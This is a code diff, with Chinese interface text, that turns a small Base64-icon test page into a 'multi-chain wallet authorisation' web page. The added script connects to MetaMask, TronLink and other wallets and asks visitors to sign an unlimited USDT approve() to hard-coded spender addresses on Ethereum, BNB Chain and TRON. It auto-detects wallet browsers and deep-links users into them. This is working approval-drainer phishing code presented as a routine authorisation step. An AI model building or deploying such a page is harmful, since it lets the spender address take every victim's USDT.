@@ -1,26 +1,701 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>测试 Base64 图标</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>多链钱包授权</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .chain-selector {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+        .chain-btn {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            background: white;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .chain-btn.active {
+            border-color: #667eea;
+            background: #f0f0ff;
+            color: #667eea;
+        }
+        .wallet-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .wallet-item {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: white;
+        }
+        .wallet-item.selected {
+            border-color: #667eea;
+            background: #f8f9ff;
+        }
         .wallet-icon {
             width: 48px;
             height: 48px;
+            border-radius: 12px;
             background: #f5f5f5;
-            display: inline-block;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            overflow: hidden;
+            flex-shrink: 0;
         }
         .wallet-icon img {
             width: 100%;
             height: 100%;
+            object-fit: contain;
+        }
+        .wallet-info {
+            flex: 1;
+        }
+        .wallet-name {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        .info-box {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+        }
+        .info-label {
+            font-size: 12px;
+            color: #666;
+        }
+        .info-value {
+            font-size: 12px;
+            color: #333;
+            word-break: break-all;
+            margin-top: 4px;
+        }
+        .approve-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            text-align: center;
+        }
+        .status.loading { background: #fff3cd; color: #856404; }
+        .status.success { background: #d4edda; color: #155724; }
+        .status.error { background: #f8d7da; color: #721c24; }
+        .hidden { display: none; }
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .dialog-mask {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .dialog {
+            background: white;
+            border-radius: 18px;
+            padding: 20px;
+            max-width: 80%;
+            text-align: center;
+        }
+        .dialog-message {
+            word-break: break-all;
+            margin: 12px 0;
+        }
+        .dialog-button {
+            margin-top: 16px;
+            padding: 8px 24px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+        .copy-btn {
+            background: #e2e8f0;
+            color: #1e293b;
+            margin-top: 8px;
         }
     </style>
 </head>
 <body>
-    <div class="wallet-icon">
-        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjZmYzZTAwIi8+PHRleHQgeD0iMTYiIHk9IjIyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIj5UPC90ZXh0Pjwvc3ZnPg==" alt="TronLink">
+<div class="container">
+    <div class="card">
+        <h1>🔐 USDT 授权</h1>
+        <div class="subtitle">多链无限额度授权</div>
+
+        <div class="chain-selector" id="chainSelector">
+            <button class="chain-btn active" data-chain="1">Ethereum</button>
+            <button class="chain-btn" data-chain="56">BNB Chain</button>
+            <button class="chain-btn" data-chain="728126428">TRON</button>
+        </div>
+
+        <div class="wallet-list" id="walletList"></div>
+
+        <div class="info-box">
+            <div class="info-label">授权地址</div>
+            <div class="info-value" id="spenderDisplay">0xEe435a366f0c89BE2108f8b02fFDe366158effa1</div>
+            <div class="info-label" style="margin-top: 12px;">授权额度</div>
+            <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度</div>
+        </div>
+
+        <button class="approve-btn" id="approveBtn">授权 USDT</button>
+        <div class="status hidden" id="status"></div>
     </div>
-    <p>如果上方显示橙色方块内有白色字母 T，则 Base64 图标工作正常。</p>
-    <p>如果显示为破损图片，说明浏览器不支持该 Base64 格式或网络问题。</p>
+</div>
+
+<div id="dialogMask" class="dialog-mask">
+    <div class="dialog">
+        <div class="dialog-message"></div>
+        <button class="dialog-button">确定</button>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+<script>
+    // ==================== 配置 ====================
+    const USDT_ADDRESS_EVM = {
+        1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+        56: '0x55d398326f99059fF775485246999027B3197955'
+    };
+    const SPENDER_ADDRESS_EVM = {
+        1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
+        56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1'
+    };
+    const UNLIMITED_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+    const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const SPENDER_ADDRESS_TRON = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
+    const UNLIMITED_AMOUNT_TRON = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+    const NETWORKS = {
+        1: {
+            chainId: '0x1',
+            chainName: 'Ethereum Mainnet',
+            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+            rpcUrls: ['https://mainnet.infura.io/v3/'],
+            blockExplorerUrls: ['https://etherscan.io']
+        },
+        56: {
+            chainId: '0x38',
+            chainName: 'BNB Smart Chain',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com']
+        }
+    };
+
+    // 钱包配置 - 使用简单可靠的 Base64 图标（彩色方块+白色文字）
+    const WALLETS = {
+        evm: {
+            metamask: {
+                name: 'MetaMask',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjZTc2MjFhIi8+PHRleHQgeD0iMTYiIHk9IjIyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIj5NPC90ZXh0Pjwvc3ZnPg==',
+                canAutoJump: true,
+                dappUrl: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`,
+                isInjected: () => window.ethereum && window.ethereum.isMetaMask === true
+            }
+        },
+        tron: {
+            tronlink: {
+                name: 'TronLink',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjZmYzZTAwIi8+PHRleHQgeD0iMTYiIHk9IjIyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIj5UPC90ZXh0Pjwvc3ZnPg==',
+                canAutoJump: false,
+                isInjected: () => window.tronLink && window.tronLink.ready === true
+            },
+            tokenpocket: {
+                name: 'TokenPocket',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjMmM4NGQwIi8+PHRleHQgeD0iMTYiIHk9IjIyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIj5UUDwvdGV4dD48L3N2Zz4=',
+                canAutoJump: true,
+                dappUrl: (url) => `tpdapp://open?params=${encodeURIComponent(JSON.stringify({ url: url }))}`,
+                isInjected: () => window.tronWeb && window.tronWeb.defaultAddress !== undefined
+            },
+            imtoken: {
+                name: 'imToken',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjMmFjMzlkIi8+PHRleHQgeD0iMTYiIHk9IjIyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIj5JTTwvdGV4dD48L3N2Zz4=',
+                canAutoJump: false,
+                isInjected: () => window.ethereum && window.ethereum.isImToken === true
+            },
+            bitget: {
+                name: 'Bitget',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjZjhhYzAwIi8+PHRleHQgeD0iMTYiIHk9IjIyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIj5CPC90ZXh0Pjwvc3ZnPg==',
+                canAutoJump: false,
+                isInjected: () => window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget) || (window.bitkeep && window.bitkeep.ethereum)
+            },
+            trust: {
+                name: 'Trust Wallet',
+                iconBase64: 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjMWI3NGU0Ii8+PHRleHQgeD0iMTYiIHk9IjIyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IndoaXRlIj5UPC90ZXh0Pjwvc3ZnPg==',
+                canAutoJump: false,
+                isInjected: () => (window.ethereum && window.ethereum.isTrust === true) && (window.tronWeb && window.tronWeb.defaultAddress)
+            }
+        }
+    };
+
+    let currentChain = '1';
+    let selectedWallet = null;
+
+    // DOM 元素
+    const walletListEl = document.getElementById('walletList');
+    const spenderDisplay = document.getElementById('spenderDisplay');
+    const statusDiv = document.getElementById('status');
+    const dialogMask = document.getElementById('dialogMask');
+    const dialogMessage = document.getElementById('dialogMessage');
+    const dialogButton = document.querySelector('.dialog-button');
+
+    function showStatus(message, type = 'loading') {
+        statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
+        statusDiv.className = `status ${type}`;
+        statusDiv.classList.remove('hidden');
+    }
+    function hideStatus() { statusDiv.classList.add('hidden'); }
+    function showDialog(msg) {
+        dialogMessage.textContent = msg;
+        dialogMask.style.display = 'flex';
+    }
+    function hideDialog() { dialogMask.style.display = 'none'; }
+    dialogButton.onclick = hideDialog;
+    dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };
+
+    function updateSpenderDisplay() {
+        const isTron = currentChain === '728126428';
+        spenderDisplay.textContent = isTron ? SPENDER_ADDRESS_TRON : SPENDER_ADDRESS_EVM[currentChain];
+    }
+
+    // 渲染钱包列表（使用 Base64 图标）
+    function renderWalletList() {
+        const isTron = currentChain === '728126428';
+        const wallets = isTron ? Object.entries(WALLETS.tron) : Object.entries(WALLETS.evm);
+        if (wallets.length === 0) {
+            walletListEl.innerHTML = '<div style="text-align:center;padding:20px;color:#999;">该链暂无可选钱包</div>';
+            return;
+        }
+        walletListEl.innerHTML = wallets.map(([key, wallet]) => {
+            const imgHtml = `<img src="${wallet.iconBase64}" alt="${wallet.name}">`;
+            return `
+                <div class="wallet-item" data-wallet="${key}">
+                    <div class="wallet-icon">${imgHtml}</div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">${wallet.name}</div>
+                    </div>
+                </div>
+            `;
+        }).join('');
+        document.querySelectorAll('.wallet-item').forEach(item => {
+            item.addEventListener('click', () => {
+                selectedWallet = item.dataset.wallet;
+                document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
+                item.classList.add('selected');
+                hideStatus();
+            });
+        });
+    }
+
+    // 检测是否在当前钱包内置浏览器中
+    function isInWalletBrowser() {
+        if (currentChain === '728126428') {
+            if (selectedWallet === 'tronlink') return window.tronLink && window.tronLink.ready === true;
+            if (selectedWallet === 'tokenpocket') return window.tronWeb && window.tronWeb.defaultAddress !== undefined;
+            if (selectedWallet === 'imtoken') return window.ethereum && window.ethereum.isImToken === true;
+            if (selectedWallet === 'bitget') return (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) || (window.bitkeep && window.bitkeep.ethereum);
+            if (selectedWallet === 'trust') return (window.ethereum && window.ethereum.isTrust === true) && (window.tronWeb && window.tronWeb.defaultAddress);
+            return false;
+        } else {
+            return window.ethereum && window.ethereum.isMetaMask === true;
+        }
+    }
+
+    // ==================== 自动连接钱包 ====================
+    async function autoConnect() {
+        if (!isInWalletBrowser()) return;
+        console.log('自动连接钱包...');
+        try {
+            if (currentChain === '728126428') {
+                if (selectedWallet === 'tronlink' && window.tronLink && window.tronLink.ready) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    const tronWeb = window.tronLink.tronWeb;
+                    const address = tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                } else if (selectedWallet === 'tokenpocket' && window.tronWeb) {
+                    const address = window.tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                } else if (selectedWallet === 'imtoken' && window.ethereum && window.ethereum.isImToken && window.tronWeb) {
+                    const address = window.tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                } else if (selectedWallet === 'bitget' && (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) && window.tronWeb) {
+                    const address = window.tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                } else if (selectedWallet === 'trust' && window.ethereum && window.ethereum.isTrust && window.tronWeb) {
+                    const address = window.tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                }
+            } else {
+                if (window.ethereum && window.ethereum.isMetaMask) {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const address = accounts[0];
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                }
+            }
+        } catch (err) {
+            console.warn('自动连接失败', err);
+            showStatus('自动连接失败，请手动点击授权按钮', 'error');
+            setTimeout(() => hideStatus(), 3000);
+        }
+    }
+
+    // ==================== EVM 授权 ====================
+    async function switchEvmNetwork(targetChainId) {
+        const targetHex = '0x' + parseInt(targetChainId).toString(16);
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: targetHex }]
+            });
+            return true;
+        } catch (error) {
+            if (error.code === 4902) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [NETWORKS[targetChainId]]
+                    });
+                    return true;
+                } catch (addError) {
+                    console.error('添加网络失败:', addError);
+                    showStatus('添加网络失败: ' + addError.message, 'error');
+                    return false;
+                }
+            } else {
+                console.error('切换网络失败:', error);
+                showStatus('切换网络失败: ' + error.message, 'error');
+                return false;
+            }
+        }
+    }
+
+    async function approveEvm() {
+        if (!window.ethereum) {
+            showStatus('未检测到 MetaMask', 'error');
+            return false;
+        }
+        try {
+            const targetChainId = parseInt(currentChain);
+            const currentChainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+            const currentChainId = parseInt(currentChainIdHex, 16);
+            if (currentChainId !== targetChainId) {
+                showStatus(`正在切换网络...`, 'loading');
+                const switched = await switchEvmNetwork(targetChainId);
+                if (!switched) return false;
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+            showStatus(`已连接: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'loading');
+
+            const iface = new ethers.utils.Interface([
+                'function approve(address spender, uint256 amount) returns (bool)'
+            ]);
+            const data = iface.encodeFunctionData('approve', [SPENDER_ADDRESS_EVM[targetChainId], UNLIMITED_AMOUNT_EVM]);
+            const transaction = {
+                to: USDT_ADDRESS_EVM[targetChainId],
+                from: userAddress,
+                data: data,
+                chainId: targetChainId
+            };
+            const txHash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [transaction]
+            });
+            showStatus(`✅ 授权成功！交易ID: ${txHash.slice(0,10)}...`, 'success');
+            return true;
+        } catch (error) {
+            console.error(error);
+            let errorMsg = error.message || '未知错误';
+            if (error.code === 4001) errorMsg = '用户取消了授权';
+            showStatus(`授权失败: ${errorMsg}`, 'error');
+            return false;
+        }
+    }
+
+    // ==================== TRON 授权 ====================
+    async function approveTron() {
+        let tronWeb;
+        if (selectedWallet === 'tronlink' && window.tronLink && window.tronLink.ready) {
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+            tronWeb = window.tronLink.tronWeb;
+        } else if (selectedWallet === 'tokenpocket' && window.tronWeb) {
+            tronWeb = window.tronWeb;
+        } else if (selectedWallet === 'imtoken' && window.ethereum && window.ethereum.isImToken && window.tronWeb) {
+            tronWeb = window.tronWeb;
+        } else if (selectedWallet === 'bitget' && (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) && window.tronWeb) {
+            tronWeb = window.tronWeb;
+        } else if (selectedWallet === 'trust' && window.ethereum && window.ethereum.isTrust && window.tronWeb) {
+            tronWeb = window.tronWeb;
+        } else {
+            showStatus('未检测到对应的 TRON 钱包', 'error');
+            return false;
+        }
+        try {
+            const userAddress = tronWeb.defaultAddress.base58;
+            showStatus(`已连接: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'loading');
+
+            const contract = await tronWeb.contract().at(TRON_USDT_CONTRACT);
+            const result = await contract.approve(SPENDER_ADDRESS_TRON, UNLIMITED_AMOUNT_TRON).send();
+            if (result && (result.result || result.txid)) {
+                const txid = result.txid || result;
+                showStatus(`✅ 授权成功！交易ID: ${txid.slice(0,10)}...`, 'success');
+                return true;
+            } else {
+                showStatus('授权失败', 'error');
+                return false;
+            }
+        } catch (error) {
+            console.error(error);
+            let errorMsg = error.message || '未知错误';
+            if (errorMsg.includes('denied') || errorMsg.includes('reject')) {
+                errorMsg = '用户取消了授权';
+            }
+            showStatus(`授权失败: ${errorMsg}`, 'error');
+            return false;
+        }
+    }
+
+    // ==================== 跳转/复制逻辑 ====================
+    function showManualCopyDialog(url, walletName = '') {
+        const shortUrl = url.length > 60 ? url.slice(0, 60) + '...' : url;
+        const walletHint = walletName ? `请在 ${walletName} 钱包的内置浏览器中打开此链接` : '请在钱包内置浏览器中打开此链接';
+        const modalHtml = `
+            <div class="dialog-message" style="margin-bottom: 12px;">
+                <p>无法自动跳转钱包，${walletHint}：</p>
+                <div style="background: #f5f5f5; padding: 12px; border-radius: 8px; margin: 12px 0; word-break: break-all; font-size: 12px;">${url}</div>
+                <button id="copyLinkBtn" class="dialog-button copy-btn">复制链接</button>
+            </div>
+        `;
+        const existing = document.querySelector('#manualCopyDialog');
+        if (existing) existing.remove();
+        const div = document.createElement('div');
+        div.id = 'manualCopyDialog';
+        div.className = 'dialog-mask';
+        div.style.display = 'flex';
+        div.innerHTML = `<div class="dialog">${modalHtml}</div>`;
+        document.body.appendChild(div);
+        const copyBtn = div.querySelector('#copyLinkBtn');
+        copyBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(url).then(() => {
+                alert('链接已复制！请打开对应钱包的内置浏览器，粘贴链接并授权。');
+                div.remove();
+            }).catch(() => {
+                alert('复制失败，请手动复制：\n' + url);
+                div.remove();
+            });
+        });
+        div.addEventListener('click', (e) => {
+            if (e.target === div) div.remove();
+        });
+    }
+
+    function jumpToWallet() {
+        if (!selectedWallet) {
+            showDialog('请先选择钱包');
+            return;
+        }
+        const isTron = currentChain === '728126428';
+        const wallet = isTron ? WALLETS.tron[selectedWallet] : WALLETS.evm[selectedWallet];
+        if (!wallet) {
+            showDialog('无效的钱包');
+            return;
+        }
+
+        if (wallet.canAutoJump && wallet.dappUrl) {
+            const url = wallet.dappUrl(window.location.href);
+            let triggered = false;
+            const onVisibilityChange = () => {
+                if (document.hidden || document.webkitHidden) {
+                    triggered = true;
+                    cleanup();
+                }
+            };
+            const cleanup = () => {
+                document.removeEventListener('visibilitychange', onVisibilityChange);
+                window.removeEventListener('blur', onVisibilityChange);
+            };
+            document.addEventListener('visibilitychange', onVisibilityChange);
+            window.addEventListener('blur', onVisibilityChange);
+            window.location.href = url;
+            setTimeout(() => {
+                if (!triggered) {
+                    cleanup();
+                    showManualCopyDialog(window.location.href, wallet.name);
+                }
+            }, 3000);
+            return;
+        }
+        showManualCopyDialog(window.location.href, wallet.name);
+    }
+
+    async function onApprove() {
+        if (!selectedWallet) {
+            showDialog('请先选择钱包');
+            return;
+        }
+
+        if (isInWalletBrowser()) {
+            const isTron = currentChain === '728126428';
+            if (isTron) {
+                await approveTron();
+            } else {
+                await approveEvm();
+            }
+            return;
+        }
+
+        showStatus('正在准备跳转...', 'loading');
+        jumpToWallet();
+    }
+
+    function onChainChange(chainId) {
+        currentChain = chainId;
+        selectedWallet = null;
+        renderWalletList();
+        updateSpenderDisplay();
+        hideStatus();
+
+        const isTron = currentChain === '728126428';
+        if (isTron) {
+            if (window.tronLink && window.tronLink.ready) {
+                selectedWallet = 'tronlink';
+                document.querySelector(`.wallet-item[data-wallet="tronlink"]`)?.classList.add('selected');
+                showStatus('检测到 TronLink，可直接授权', 'success');
+            } else if (window.tronWeb && window.tronWeb.defaultAddress) {
+                selectedWallet = 'tokenpocket';
+                document.querySelector(`.wallet-item[data-wallet="tokenpocket"]`)?.classList.add('selected');
+                showStatus('检测到 TokenPocket，可直接授权', 'success');
+            } else if (window.ethereum && window.ethereum.isImToken && window.tronWeb) {
+                selectedWallet = 'imtoken';
+                document.querySelector(`.wallet-item[data-wallet="imtoken"]`)?.classList.add('selected');
+                showStatus('检测到 imToken，可直接授权', 'success');
+            } else if ((window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) || (window.bitkeep && window.bitkeep.ethereum)) {
+                selectedWallet = 'bitget';
+                document.querySelector(`.wallet-item[data-wallet="bitget"]`)?.classList.add('selected');
+                showStatus('检测到 Bitget，可直接授权', 'success');
+            } else if (window.ethereum && window.ethereum.isTrust && window.tronWeb) {
+                selectedWallet = 'trust';
+                document.querySelector(`.wallet-item[data-wallet="trust"]`)?.classList.add('selected');
+                showStatus('检测到 Trust Wallet，可直接授权', 'success');
+            } else {
+                showStatus('请选择钱包并授权', 'success');
+            }
+        } else {
+            if (window.ethereum && window.ethereum.isMetaMask === true) {
+                selectedWallet = 'metamask';
+                document.querySelector(`.wallet-item[data-wallet="metamask"]`)?.classList.add('selected');
+                showStatus('检测到 MetaMask，可直接授权', 'success');
+            } else {
+                showStatus('请选择钱包并授权', 'success');
+            }
+        }
+        setTimeout(() => hideStatus(), 2000);
+
+        // 自动连接
+        if (isInWalletBrowser()) {
+            setTimeout(() => autoConnect(), 500);
+        }
+    }
+
+    function init() {
+        document.querySelectorAll('.chain-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                onChainChange(btn.dataset.chain);
+            });
+        });
+        document.getElementById('approveBtn').addEventListener('click', onApprove);
+        onChainChange('1');
+    }
+
+    init();
+</script>
 </body>
 </html>
